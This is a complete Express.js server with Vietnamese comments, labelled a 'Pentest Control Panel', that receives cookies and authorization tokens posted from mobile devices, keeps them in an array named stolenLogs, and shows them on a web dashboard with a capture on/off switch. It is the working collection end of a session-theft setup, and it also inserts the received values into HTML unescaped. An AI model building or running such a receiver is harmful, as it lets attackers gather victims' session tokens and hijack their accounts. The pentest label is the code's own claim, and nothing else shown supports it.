const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// Biến trạng thái công tắc thu thập (Mặc định là false - Tắt)
let isCapturingEnabled = false;

// Mảng lưu trữ các log thu thập được
let stolenLogs = [];

// API cho phép client kiểm tra trạng thái bật/tắt trước khi gửi dữ liệu
app.get('/status', (req, res) => {
    res.json({ enabled: isCapturingEnabled });
});

// API Thay đổi trạng thái công tắc từ giao diện Web
app.post('/toggle', (req, res) => {
    isCapturingEnabled = req.body.enabled;
    console.log(`⚙️ Trạng thái thu thập dữ liệu đã được đổi thành: ${isCapturingEnabled ? 'BẬT' : 'TẮT'}`);
    res.json({ status: "success", enabled: isCapturingEnabled });
});

// 1. Nhận dữ liệu Cookie/Token từ điện thoại gửi về
app.post('/', (req, res) => {
    if (!isCapturingEnabled) {
        return res.status(403).json({ status: "ignored", message: "Thu thập dữ liệu đang bị tắt từ phía Server." });
    }

    const { url, cookie, token } = req.body;
    
    console.log(`[${new Date().toLocaleTimeString()}] Nhận dữ liệu từ URL: ${url}`);

    stolenLogs.push({
        time: new Date().toLocaleString(),
        url: url || 'Không rõ URL',
        cookie: cookie || null,
        token: token || null
    });

    if (stolenLogs.length > 100) {
        stolenLogs.shift();
    }

    res.status(200).json({ status: "success" });
});

// 2. Hiển thị giao diện theo dõi trên trình duyệt kèm công tắc bật/tắt
app.get('/', (req, res) => {
    let logRows = '';
    
    if (stolenLogs.length === 0) {
        logRows = `<tr><td colspan="4" style="text-align:center; padding: 20px; color: #888;">Chưa nhận được dữ liệu nào... Hoạt động ứng dụng trên điện thoại để test.</td></tr>`;
    } else {
        stolenLogs.slice().reverse().forEach((log) => {
            logRows += `
                <tr style="border-bottom: 1px solid #ddd;">
                    <td style="padding: 12px; color: #666; font-size: 14px;">${log.time}</td>
                    <td style="padding: 12px; font-weight: bold; color: #007bff; word-break: break-all;">${log.url}</td>
                    <td style="padding: 12px; background: #fdf5e6;"><pre style="margin:0; white-space: pre-wrap; word-break: break-all; font-family: monospace;">${log.cookie || '<span style="color:red">Không có</span>'}</pre></td>
                    <td style="padding: 12px; background: #eef9ff;"><pre style="margin:0; white-space: pre-wrap; word-break: break-all; font-family: monospace;">${log.token || '<span style="color:red">Không có</span>'}</pre></td>
                </tr>
            `;
        });
    }

    res.send(`
    <!DOCTYPE html>
    <html lang="vi">
    <head>
        <meta charset="UTF-8">
        <title>Pentest Control Panel</title>
        <style>
            .switch { position: relative; display: inline-block; width: 60px; height: 34px; vertical-align: middle; }
            .switch input { opacity: 0; width: 0; height: 0; }
            .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; transition: .4s; border-radius: 34px; }
            .slider:before { position: absolute; content: ""; height: 26px; width: 26px; left: 4px; bottom: 4px; background-color: white; transition: .4s; border-radius: 50%; }
            input:checked + .slider { background-color: #28a745; }
            input:checked + .slider:before { transform: translateX(26px); }
        </style>
    </head>
    <body style="font-family: system-ui, -apple-system, sans-serif; margin: 30px; background-color: #f8f9fa;">
        <h2 style="color: #333; border-bottom: 2px solid #333; padding-bottom: 10px;">🛡️ Máy Chủ Thử Nghiệm Thu Thập Dữ Liệu (Pentest Logs)</h2>
        
        <div style="background: white; padding: 15px 20px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); margin-bottom: 20px; display: flex; align-items: center; justify-content: space-between;">
            <div>
                <strong>Trạng thái thu thập từ Server:</strong> 
                <span id="status-text" style="font-weight: bold; margin-left: 5px; color: ${isCapturingEnabled ? '#28a745' : '#dc3545'};">
                    ${isCapturingEnabled ? 'ĐANG BẬT (Đang nhận dữ liệu)' : 'ĐANG TẮT (Bỏ qua dữ liệu)'}
                </span>
            </div>
            <label class="switch">
                <input type="checkbox" id="captureToggle" ${isCapturingEnabled ? 'checked' : ''} onclick="toggleCapture(this)">
                <span class="slider"></span>
            </label>
        </div>

        <p>Hệ thống tự động cập nhật khi bạn reload trang này.</p>
        <table style="width: 100%; border-collapse: collapse; background: white; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border-radius: 8px; overflow: hidden;">
            <thead>
                <tr style="background-color: #343a40; color: white; text-align: left;">
                    <th style="padding: 12px; width: 15%;">Thời gian</th>
                    <th style="padding: 12px; width: 25%;">Ứng dụng / URL</th>
                    <th style="padding: 12px; width: 30%;">Cookie</th>
                    <th style="padding: 12px; width: 30%;">Token (Authorization)</th>
                </tr>
            </thead>
            <tbody>
                ${logRows}
            </tbody>
        </table>

        <script>
            async function toggleCapture(element) {
                const enabled = element.checked;
                try {
                    const response = await fetch('/toggle', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ enabled: enabled })
                    });
                    const data = await response.json();
                    const statusText = document.getElementById('status-text');
                    if(data.enabled) {
                        statusText.style.color = '#28a745';
                        statusText.innerText = 'ĐANG BẬT (Đang nhận dữ liệu)';
                    } else {
                        statusText.style.color = '#dc3545';
                        statusText.innerText = 'ĐANG TẮT (Bỏ qua dữ liệu)';
                    }
                } catch (err) {
                    alert('Không thể thay đổi trạng thái kết nối tới server!');
                    element.checked = !enabled;
                }
            }
        </script>
    </body>
    </html>
    `);
});

app.listen(PORT, () => {
    console.log(`🚀 Server hoạt động đồng bộ tại cổng ${PORT}`);
});
